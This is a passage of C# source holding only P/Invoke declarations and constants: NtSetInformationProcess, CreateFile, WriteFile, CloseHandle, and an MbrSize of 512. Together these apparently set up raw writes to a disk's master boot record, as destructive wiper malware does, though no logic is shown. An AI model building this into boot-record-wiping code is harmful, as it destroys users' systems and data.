		hmm = 0x00100C85
	};

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(
string lpFileName,
uint dwDesiredAccess,
uint dwShareMode,
IntPtr lpSecurityAttributes,
uint dwCreationDisposition,
uint dwFlagsAndAttributes,
IntPtr hTemplateFile);
	[DllImport("kernel32")]
	private static extern bool WriteFile(
IntPtr hFile,
byte[] lpBuffer,
uint nNumberOfBytesToWrite,
out uint lpNumberOfBytesWritten,
IntPtr lpOverlapped);

	private const uint GenericRead = 0x80000000;
	private const uint GenericWrite = 0x40000000;
	private const uint GenericExecute = 0x20000000;
	private const uint GenericAll = 0x10000000;

	private const uint FileShareRead = 0x1;
	private const uint FileShareWrite = 0x2;

	//dwCreationDisposition
	private const uint OpenExisting = 0x3;

	//dwFlagsAndAttributes
	private const uint FileFlagDeleteOnClose = 0x4000000;

	private const uint MbrSize = 512u;
	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool CloseHandle(IntPtr hHandle);
}